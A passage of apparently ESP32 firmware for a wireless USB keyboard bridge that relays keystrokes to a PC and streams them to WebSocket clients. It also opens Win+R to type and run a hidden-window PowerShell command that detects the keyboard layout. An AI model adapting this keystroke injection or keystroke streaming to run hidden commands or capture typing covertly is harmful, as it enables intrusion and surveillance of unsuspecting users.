  LOGLN("========================================");
}

// =====================================================================
// Main Loop
// =====================================================================
void loop() {
  // Handle HTTP + WebSocket clients (sync — must call every loop)
  server.handleClient();
  webSocket.loop();

  // --- CapsLock LED broadcast to web clients ---
  if (capsLockLedChanged) {
    capsLockLedChanged = false;
    char msg[16];
    snprintf(msg, sizeof(msg), "LED:CAPS:%d", capsLockLed ? 1 : 0);
    webSocket.broadcastTXT(msg);
    LOG("[LED] CapsLock=%d\n", capsLockLed ? 1 : 0);
  }

  // --- Language Detection State Machine ---
  switch (ldState) {
  case LD_IDLE:
    break;
  case LD_ENSURE_CAPS_OFF:
    if (capsLockLed) {
      Keyboard.press(KEY_CAPS_LOCK);
      delay(20);
      Keyboard.releaseAll();
      ldState = LD_WAIT_CAPS_OFF;
      ldTimer = millis();
    } else {
      ldState = LD_OPEN_RUN;
      ldTimer = millis();
    }
    break;
  case LD_WAIT_CAPS_OFF:
    if (!capsLockLed || millis() - ldTimer > 500) {
      ldState = LD_OPEN_RUN;
      ldTimer = millis();
    }
    break;
  case LD_OPEN_RUN:
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(20);
    Keyboard.releaseAll();
    ldState = LD_WAIT_RUN;
    ldTimer = millis();
    LOG("[LangDetect] Win+R\n");
    break;
  case LD_WAIT_RUN:
    if (millis() - ldTimer > 800) {
      ldState = LD_TYPE_CMD;
    }
    break;
  case LD_TYPE_CMD: {
    // Simple: always press CapsLock via PowerShell.
    // If EN mode → command runs → CapsLock ON = English detected
    // If TH mode → command garbled → nothing → CapsLock stays OFF = Thai
    const char *cmd =
        "powershell -w h -c \"(New-Object -Com WScript.Shell)"
        ".SendKeys('{CAPSLOCK}')\"";
    Keyboard.print(cmd);
    ldState = LD_WAIT_TYPE;
    ldTimer = millis();
    LOG("[LangDetect] Command typed\n");
    break;
  }
  case LD_WAIT_TYPE:
    if (millis() - ldTimer > 500) {
      ldState = LD_PRESS_ENTER;
    }
    break;
  case LD_PRESS_ENTER:
    Keyboard.press(KEY_RETURN);
    delay(20);
    Keyboard.releaseAll();
    ldState = LD_WAIT_RESULT;
    ldTimer = millis();
    LOG("[LangDetect] Enter, waiting...\n");
    break;
  case LD_WAIT_RESULT:
    if (millis() - ldTimer > 3500) {
      ldState = LD_DISMISS_ERROR;
    }
    break;
  case LD_DISMISS_ERROR:
    // Press Escape twice: 1st closes error dialog, 2nd closes Win+R
    Keyboard.press(KEY_ESC);
    delay(20);
    Keyboard.releaseAll();
    delay(200);
    Keyboard.press(KEY_ESC);
    delay(20);
    Keyboard.releaseAll();
    delay(100);
    ldState = LD_CHECK_RESULT;
    LOG("[LangDetect] Dismiss dialogs\n");
    break;
  case LD_CHECK_RESULT:
    // Flipped logic: CapsLock ON = EN (script ran), OFF = TH (script failed)
    if (capsLockLed) {
      ldResult = "EN";
      ldState = LD_RESTORE_CAPS;
      LOG("[LangDetect] LED ON -> English\n");
    } else {
      ldResult = "TH";
      ldState = LD_SEND_RESULT;
      LOG("[LangDetect] LED OFF -> Thai\n");
    }
    break;
  case LD_RESTORE_CAPS:
    // Restore CapsLock back to OFF after English detection
    Keyboard.press(KEY_CAPS_LOCK);
    delay(20);
    Keyboard.releaseAll();
    ldState = LD_SEND_RESULT;
    ldTimer = millis();
    break;
  case LD_SEND_RESULT: {
    char json[32];
    snprintf(json, sizeof(json), "LANG:%s", ldResult.c_str());
    webSocket.broadcastTXT(json);
    LOG("[LangDetect] Result: %s\n", ldResult.c_str());
    ldState = LD_IDLE;
    break;
  }
  default:
    ldState = LD_IDLE;
    break;
  }

  // --- Process new ESP-NOW report ---
  if (newReportAvailable) {
    newReportAvailable = false;

    kbd_report_t report;
    memcpy(&report, (void *)&latestReport, sizeof(kbd_report_t));

    // 1. Forward to PC via USB HID
    forwardReportToPC(report);

    // 2. Broadcast new keystrokes to WebSocket clients
    broadcastKeystrokes(report, prevReport);

    // 3. Track key state
    bool anyKey = (report.modifier != 0);
    for (int i = 0; i < 6 && !anyKey; i++) {
      if (report.keycodes[i] != 0)
        anyKey = true;
    }
    keysPressed = anyKey;

    // 4. Save current as previous
    memcpy(&prevReport, &report, sizeof(kbd_report_t));
  }

  // --- Watchdog: release all keys if no packet for timeout ---
  if (keysPressed && (millis() - lastPacketTime > KEY_RELEASE_TIMEOUT_MS)) {
    LOGLN("[Watchdog] No packet — releasing all keys");
    releaseAllKeys();
    keysPressed = false;
    memset(&prevReport, 0, sizeof(kbd_report_t));
  }
}
